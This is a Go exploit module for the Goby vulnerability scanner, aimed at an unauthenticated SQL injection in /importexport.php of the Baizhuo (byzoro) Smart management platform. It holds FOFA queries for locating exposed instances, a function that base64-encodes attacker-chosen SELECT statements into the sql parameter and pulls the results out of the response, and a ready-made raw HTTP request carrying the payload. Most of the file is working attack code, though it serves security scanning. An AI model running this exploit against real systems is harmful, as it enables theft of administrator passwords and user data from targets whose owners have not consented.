package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "byzoro-Smart /importexport.php  SQL Injection Vulnerability",
    "Description": "<p>Baizhuo Smart Management Platform is a security gateway product of Beijing Baizhuo Network Technology Co., Ltd. (hereinafter referred to as Baizhuo Network). It is a high-tech enterprise committed to building the next generation of secure Internet.  </p><p>Baizhuo Smart management platform /importexport.php has SQL injection vulnerabilities. Unauthenticated malicious attackers can use SQL injection vulnerabilities to obtain information in the database (such as administrator back-end passwords, website users' personal information), and even with high permissions. The server writes commands to further obtain server system permissions.</p>",
    "Product": "byzoro-Smart",
    "Homepage": "http://www.byzoro.com/",
    "DisclosureDate": "2023-04-23",
    "PostTime": "2024-07-17",
    "Author": "Town",
    "FofaQuery": "body=\"document.getElementById(\\\"txt_newpwdconfirm\\\")\" && body=\"window.location='usbkeylogin.php\" && body=\"images/login_ico1\"",
    "GobyQuery": "body=\"document.getElementById(\\\"txt_newpwdconfirm\\\")\" && body=\"window.location='usbkeylogin.php\" && body=\"images/login_ico1\"",
    "Level": "2",
    "Impact": "<p>Baizhuo Smart management platform /importexport.php has SQL injection vulnerabilities. Unauthenticated malicious attackers can use SQL injection vulnerabilities to obtain information in the database (such as administrator back-end passwords, website users' personal information), and even with high permissions. The server writes commands to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, patch or upgrade to the latest version. </p><p>2. Deploy the Web application firewall to monitor the database operation. </p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "database()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "百卓Smart管理平台 /importexport.php  SQL 注入漏洞",
            "Product": "byzoro-Smart",
            "Description": "<p>百卓Smart管理平台是北京百卓网络技术有限公司(以下简称百卓网络)的一款安全网关产品，是一家致力于构建下一代安全互联网的高科技企业。&nbsp;</p><p>百卓Smart管理平台 /importexport.php 存在SQL注入漏洞，未经身份验证的恶意攻击者可以利用SQL注入漏洞来获取数据库中的信息（如管理员后端密码、网站用户个人信息），甚至以高权限向服务器写入命令，进一步获得服务器系统权限。<br><br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本。</p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>百卓Smart管理平台 /importexport.php 存在SQL注入漏洞，未经身份验证的恶意攻击者可以利用SQL注入漏洞来获取数据库中的信息（如管理员后端密码、网站用户个人信息），甚至以高权限向服务器写入命令，进一步获得服务器系统权限。<br><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "byzoro-Smart /importexport.php  SQL Injection Vulnerability",
            "Product": "byzoro-Smart",
            "Description": "<p>Baizhuo Smart Management Platform is a security gateway product of Beijing Baizhuo Network Technology Co., Ltd. (hereinafter referred to as Baizhuo Network). It is a high-tech enterprise committed to building the next generation of secure Internet.&nbsp;&nbsp;</p><p>Baizhuo Smart management platform /importexport.php has SQL injection vulnerabilities. Unauthenticated malicious attackers can use SQL injection vulnerabilities to obtain information in the database (such as administrator back-end passwords, website users' personal information), and even with high permissions. The server writes commands to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, patch or upgrade to the latest version.&nbsp;</p><p>2. Deploy the Web application firewall to monitor the database operation.&nbsp;</p><p>3. If it is not necessary, public network access to the system is prohibited.<br></p>",
            "Impact": "<p>Baizhuo Smart management platform /importexport.php has SQL injection vulnerabilities. Unauthenticated malicious attackers can use SQL injection vulnerabilities to obtain information in the database (such as administrator back-end passwords, website users' personal information), and even with high permissions. The server writes commands to further obtain server system permissions.<br><br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10972"
}`

	sendPayload_xTjL6cJiFT9Lnzz3TjOCWscSGIu0bFr6 := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		sql = "select 1," + sql + ",3"
		sql = base64.StdEncoding.EncodeToString([]byte(sql))
		payloadConfig := httpclient.NewGetRequestConfig("/importexport.php?sql=" + sql + "&type=exportexcelbysql")
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false

		resp, err := httpclient.DoHttpRequest(hostInfo, payloadConfig)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		if !strings.Contains(resp.Utf8Html, ",,,\n1,") {
			return nil, errors.New("SELECT Fail")
		}
		return resp, err

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayload_xTjL6cJiFT9Lnzz3TjOCWscSGIu0bFr6
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `user()`
			_, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/importexport.php`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayload_xTjL6cJiFT9Lnzz3TjOCWscSGIu0bFr6
			makeRegularAAAA := func(RegularContent string, RegularUrl string) (string, error) {
				reRequestAAAA := regexp.MustCompile(RegularUrl)
				if !reRequestAAAA.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequestAAAA.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			if attackType == "sql" {
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				respResult, err := makeRegularAAAA(resp.Utf8Html, `(?s)1,(.*?),`)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Output = respResult
				expResult.Success = true
			} else if attackType == "sqlPoint" {
				_, err := sendPayload(expResult.HostInfo, "user()")
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `GET /importexport.php?sql=c2VsZWN0IDEsdXNlcigpLDM=&type=exportexcelbysql HTTP/1.1
Host: ` + expResult.HostInfo.FixedHostInfo + `

`
			}
			return expResult
		},
	))
}
